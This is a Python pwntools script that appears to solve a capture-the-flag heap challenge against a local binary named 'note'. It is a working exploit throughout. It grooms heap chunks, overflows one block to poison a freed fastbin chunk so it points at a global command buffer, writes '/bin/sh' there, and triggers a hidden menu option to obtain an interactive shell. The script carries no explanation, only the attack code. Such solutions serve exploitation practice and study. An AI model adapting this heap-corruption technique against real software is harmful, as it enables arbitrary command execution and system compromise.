from pwn import *
context.log_level='debug'

p=process('./note')
cmd=0x602098

def add(name,content):
	p.sendlineafter("please input the command:\n",'1')
	p.sendafter("block name:",name)
	p.sendafter("block content:",content)

def f1234(name,content):
	p.sendlineafter("please input the command:\n",'1234')
	p.sendafter("input the secret name:",name)
	p.sendlineafter("please input the content:\n",content)
def dele(idx):
	p.sendlineafter("please input the command:\n",'4')
	p.sendlineafter("please input the block id:",str(idx))

def edit(idx,name,content):
	p.sendlineafter("please input the command:\n",'2')
	p.sendlineafter("please input the index you want to edit\n",str(idx))
	p.sendafter("please input name:\n",name)
	p.sendlineafter("please input the content:\n",content)
	
p.sendafter("Please leave your name :",'\x21\x00\x00\x00\x00')

add('0gur1\n','content\n')#0->0x10
add('1gur1\n','content\n')#1->0x30
add('2gur1\n','content\n')#2->0x50
add('3gur1\n','content\n')#3->0x70
add('4gur1\n','content\n')#4->0x90
add('5gur1\n','content\n')#5->0xb0


f1234('secret\n','content\n')#0xd0
add('6gur1\n','content\n')#6->0x100
add('7gur1\n','1'*32)#7->0x120;change to #7->0x100

dele(6)#fb->0x100
edit(7,p64(cmd-0x10),'content\n')#fb->0x100->cmd
add('8gur1\n','content\n')#8->100
add('/bin/sh\n','content\n')#9->cmd

p.sendlineafter("please input the command:\n",'2333')

p.interactive()

